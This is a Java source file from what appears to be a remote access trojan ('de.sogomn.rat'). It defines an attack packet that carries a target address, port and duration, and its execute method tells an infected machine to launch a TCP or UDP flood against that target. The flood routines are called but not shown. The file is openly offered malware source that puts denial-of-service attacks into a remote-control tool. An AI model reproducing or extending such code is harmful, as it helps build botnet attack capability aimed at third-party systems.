package de.sogomn.rat.packet;

import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.attack.AttackUtils;

public final class AttackPacket implements IPacket {
	
	private byte type;
	private String address;
	private int port;
	private long duration;
	
	public static final byte TCP = 0;
	public static final byte UDP = 1;
	
	public AttackPacket(final byte type, final String address, final int port, final long duration) {
		this.type = type;
		this.address = address;
		this.port = port;
		this.duration = duration;
	}
	
	public AttackPacket() {
		this(TCP, "", 1, 0);
	}
	
	@Override
	public void send(final ActiveConnection connection) {
		connection.writeByte(type);
		connection.writeUtf(address);
		connection.writeInt(port);
		connection.writeLong(duration);
	}
	
	@Override
	public void receive(final ActiveConnection connection) {
		type = connection.readByte();
		address = connection.readUtf();
		port = connection.readInt();
		duration = connection.readLong();
	}
	
	@Override
	public void execute(final ActiveConnection connection) {
		if (type == TCP) {
			AttackUtils.launchTcpFlood(address, port, duration);
		} else if (type == UDP) {
			AttackUtils.launchUdpFlood(address, duration);
		}
	}
	
}
